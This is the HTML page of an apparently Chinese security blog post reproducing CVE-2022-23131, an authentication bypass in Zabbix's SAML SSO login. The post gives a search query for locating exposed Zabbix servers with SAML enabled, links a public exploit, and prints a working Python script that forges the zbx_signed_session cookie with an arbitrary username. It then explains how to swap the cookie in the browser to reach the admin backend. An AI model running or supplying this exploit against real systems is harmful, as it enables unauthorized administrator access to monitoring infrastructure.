@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+<head>
+    
+    <title>CVE-2022-23131---Zabbix漏洞复现 - B1gd0g</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    <link rel="shortcut icon" href="https://spring.io/images/favicon-9d25009f65637a49ac8d91eb1cf7b75e.ico" type="image/x-icon" />
+    <meta name="description" content="Zabbix Sia Zabbix是拉脱维亚Zabbix SIA（Zabbix Sia）公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。 Zabbix Frontend 存在安全漏洞，该漏洞源于在启用 SAML SSO 身份验证（非默认）的情况下，恶意行为者可以修改会话数据，因为存储在会话中的用户登录未经过验证。 未经身份验证的恶意攻击者可能会利用此问题来提升权限并获">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2022-23131---Zabbix漏洞复现">
+<meta property="og:url" content="https://b1gd0g.github.io/2022/02/21/Zabbix%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="B1gd0g">
+<meta property="og:description" content="Zabbix Sia Zabbix是拉脱维亚Zabbix SIA（Zabbix Sia）公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。 Zabbix Frontend 存在安全漏洞，该漏洞源于在启用 SAML SSO 身份验证（非默认）的情况下，恶意行为者可以修改会话数据，因为存储在会话中的用户登录未经过验证。 未经身份验证的恶意攻击者可能会利用此问题来提升权限并获">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201455024.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201455519.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201455134.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201455542.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201456283.jpg">
+<meta property="article:published_time" content="2022-02-20T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-09-30T03:45:51.499Z">
+<meta property="article:author" content="B1gd0g">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201455024.jpg">
+    
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1665474214414">
+    
+    <link rel="stylesheet" href="/css/style.css?v=1665474214414">
+
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="mdui-drawer-body-left">
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210111542873.png)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="B1gd0g" class="mdui-btn mdui-btn-icon"><img src="https://img2.baidu.com/it/u=3413024138,1887722785&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=500" alt="B1gd0g"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="B1gd0g">
+            <img src="https://img2.baidu.com/it/u=3413024138,1887722785&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=500" alt="B1gd0g" alt="B1gd0g">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>15</div>
+        <div><span>标签</span>12</div>
+        <div><span>分类</span>2</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%AF%94.html" title="杀软对比">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                杀软对比
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E7%A4%BE%E5%B7%A5%E5%AF%86%E7%A0%81.html" title="社工密码">
+            <i class="mdui-list-item-icon nexmoefont icon-coffee"></i>
+            <div class="mdui-list-item-content">
+                社工密码
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E5%AF%BC%E8%88%AA.html" title="我的导航">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                我的导航
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博主">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                关于博主
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
+            </form>
+         
+    </div>
+</div>
+
+
+
+
+    
+        
+        <!-- 一言 -->
+<div class="nexmoe-widget-wrap">
+  <h3 class="nexmoe-widget-title">
+    一言
+  </h3>
+  <div class="nexmoe-widget">
+    <ul class="hitokoto-box">
+      <li id="hitokoto_text_parent" class="hitokoto-text" hitokotoCategory="">
+        <a href="#" id="hitokoto_text">
+          
+        </a>
+        <a href="#" id="hitokoto_error_text" style="display: none;">
+          
+        </a>
+      </li>
+    </ul>
+  </div>
+</div>
+
+<script>
+  let hitokotoText = document.getElementById('hitokoto_text')
+  let hitokotoErroText = document.getElementById('hitokoto_error_text')
+  let hitokotoCategory = document.getElementById('hitokoto_text_parent').getAttribute('hitokotoCategory')
+  window.onload = function () {
+    let url = 'https://v1.hitokoto.cn'
+    if (hitokotoCategory) {
+      url += '?c=' + hitokotoCategory
+    }
+    fetch(url)
+      .then(response => response.json())
+      .then(data => {
+        hitokotoText.innerText = "「 " + data.hitokoto + " 」 from " + data.from
+        hitokotoText.href = 'https://hitokoto.cn/?uuid=' + data.uuid
+      })
+      .catch((reason) => {
+        console.error(11, reason)
+        hitokotoText.style.display = 'none'
+        hitokotoErroText.style.display = 'block'
+      })
+  }
+</script>
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/tools/">tools</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/安全小记/">安全小记</a>
+          <span class="category-list-count">10</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/Html/" style="font-size: 10px;">Html</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/cmd/" style="font-size: 10px;">cmd</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">代码审计</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 10px;">免杀</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 10px;">提权</a> <a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/" style="font-size: 10px;">红蓝对抗</a> <a href="/tags/%E9%92%93%E9%B1%BC/" style="font-size: 10px;">钓鱼</a>
+    </div>
+    
+  </div>
+
+    
+        
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2022 B1gd0g
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: 37.5%;"> 
+            <img src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201456283.jpg" alt="CVE-2022-23131---Zabbix漏洞复现" loading="lazy">
+            <h1>CVE-2022-23131---Zabbix漏洞复现</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2022年02月21日</a>
+        
+            <a class="nexmoefont icon-appstore-fill -link" href="/categories/%E5%AE%89%E5%85%A8%E5%B0%8F%E8%AE%B0/">安全小记</a>
+        
+        
+    <a><i class="nexmoefont icon-areachart"></i>约334字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要1分钟</a>
+
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <p>Zabbix Sia Zabbix是拉脱维亚Zabbix SIA（Zabbix Sia）公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。</p>
+<p>Zabbix Frontend 存在安全漏洞，该漏洞源于在启用 SAML SSO 身份验证（非默认）的情况下，恶意行为者可以修改会话数据，因为存储在会话中的用户登录未经过验证。 未经身份验证的恶意攻击者可能会利用此问题来提升权限并获得对 Zabbix 前端的管理员访问权限。</p>
+<a id="more"></a>
+
+<p>搜索语法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">title=<span class="hljs-string">&quot;Zabbix&quot;</span> and body=<span class="hljs-string">&quot;SAML&quot;</span><br></code></pre></td></tr></table></figure>
+<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201455024.jpg" alt="img" data-caption="img" loading="lazy"></p>
+<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201455519.jpg" alt="img" data-caption="img" loading="lazy"></p>
+<p>Exp：<a target="_blank" rel="noopener" href="https://github.com/Mr-xn/cve-2022-23131">https://github.com/Mr-xn/cve-2022-23131</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>(<span class="hljs-params">target, username</span>):</span><br>    resp = requests.get(url=target, verify=<span class="hljs-literal">False</span>)<br>    cookie = resp.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>)<br><br>    zbx_session = re.findall(<span class="hljs-string">r&quot;zbx_session=(.*?); &quot;</span>, cookie)<br><br>    url_decode_data = urllib.parse.unquote(zbx_session[<span class="hljs-number">0</span>], encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    base64_decode_data = base64.b64decode(url_decode_data)<br><br>    decode_to_str = <span class="hljs-built_in">str</span>(base64_decode_data, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>    to_json = json.loads(decode_to_str)<br><br>    tmp_ojb = <span class="hljs-built_in">dict</span>(saml_data=<span class="hljs-built_in">dict</span>(username_attribute=username), sessionid=to_json[<span class="hljs-string">&quot;sessionid&quot;</span>], sign=to_json[<span class="hljs-string">&quot;sign&quot;</span>])<br><br>    payloadJson = json.dumps(tmp_ojb)<br>    print(<span class="hljs-string">&quot;decode_payload:&quot;</span>, payloadJson)<br><br>    payload = urllib.parse.quote(base64.b64encode(payloadJson.encode()))<br>    print(<span class="hljs-string">&quot;zbx_signed_session:&quot;</span>, payload)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>        print(<span class="hljs-string">&quot;argv error&quot;</span>)<br>        exit(<span class="hljs-number">0</span>)<br>    target = sys.argv[<span class="hljs-number">1</span>]<br>    username = sys.argv[<span class="hljs-number">2</span>]<br><br>    exp(target, username)<br></code></pre></td></tr></table></figure>
+
+
+<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201455134.jpg" alt="img" data-caption="img" loading="lazy"></p>
+<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201455542.jpg" alt="img" data-caption="img" loading="lazy"></p>
+<p>利用cookie修改插件或者F12修改，没区别，改完之后点击Sign in with Single Sign-On (SAML)即可绕过认证成功登陆后台</p>
+<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201456283.jpg" alt="img" data-caption="img" loading="lazy"></p>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-search-space">
+	<div class="search-container">
+		<div class="search-header">
+			<div class="search-input-container">
+				<input
+					class="search-input"
+					type="text"
+					placeholder="搜索"
+					oninput="sinput();"
+				/>
+			</div>
+			<a class="search-close" onclick="sclose();">×</a>
+		</div>
+		<div class="search-body"></div>
+	</div>
+</div>
+
+    
+<script src="/lib/mdui_043tiny/mdui.js"></script>
+<script src="/lib/fancybox/fancybox.umd.js"></script>
+
+
+ 
+
+<script async src="/js/app.js?v=1665474214416"></script>
+
+
+
+</body>
+
+</html>
